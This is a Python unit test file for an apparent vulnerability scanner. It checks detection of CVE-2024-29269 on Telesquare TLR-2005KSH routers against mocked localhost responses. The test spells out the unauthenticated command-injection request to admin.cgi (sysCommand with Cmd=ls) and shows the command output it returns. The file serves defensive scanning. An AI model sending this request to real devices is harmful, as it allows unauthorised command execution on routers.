"""Unit tests for Agent Asteroid: CVE-2024-29269"""

import requests_mock as req_mock

from agent import definitions
from agent.exploits import cve_2024_29269


def testCVE202429269_whenVulnerable_reportFinding(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2024-29269 unit test: case when target is vulnerable."""
    requests_mock.get(
        "http://localhost:80/",
        text="<title>Login to TLR-2005KSH</title>",
        status_code=200,
    )
    requests_mock.get(
        "http://localhost:80/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ls",
        text=(
            '<?xml version="1.0" encoding="UTF-8" ?>\n'
            "<xml>\n"
            "<CmdResult><![CDATA[web\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[update.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[lte.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[ExportTrafficLog.sh\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[nms.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[admin.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[bip.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[systemutil.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[wireless.cgi\n"
            "]]></CmdResult>\n"
            "<CmdResult><![CDATA[ExportvpnLog.sh\n"
            "]]></CmdResult>"
        ),
        status_code=200,
    )
    exploit_instance = cve_2024_29269.CVE202429269Exploit()
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    vulnerability = vulnerabilities[0]
    assert (
        vulnerability.entry.title
        == "Telesquare TLR-2005KSH Unauthorized Remote Command Execution Vulnerability"
    )
    assert vulnerability.technical_detail == (
        "http://localhost:80 is vulnerable to CVE-2024-29269, Telesquare "
        "TLR-2005KSH Unauthorized Remote Command Execution Vulnerability"
    )


def testCVE202429269_whenSafe_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2024-29269 unit test: case when target is safe."""
    exploit_instance = cve_2024_29269.CVE202429269Exploit()
    requests_mock.get(
        "http://localhost:80/",
        text="<title>Login to TLR-2005KSH</title>",
        status_code=200,
    )
    requests_mock.get(
        "http://localhost:80/cgi-bin/admin.cgi",
        text="",
        status_code=200,
    )
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0
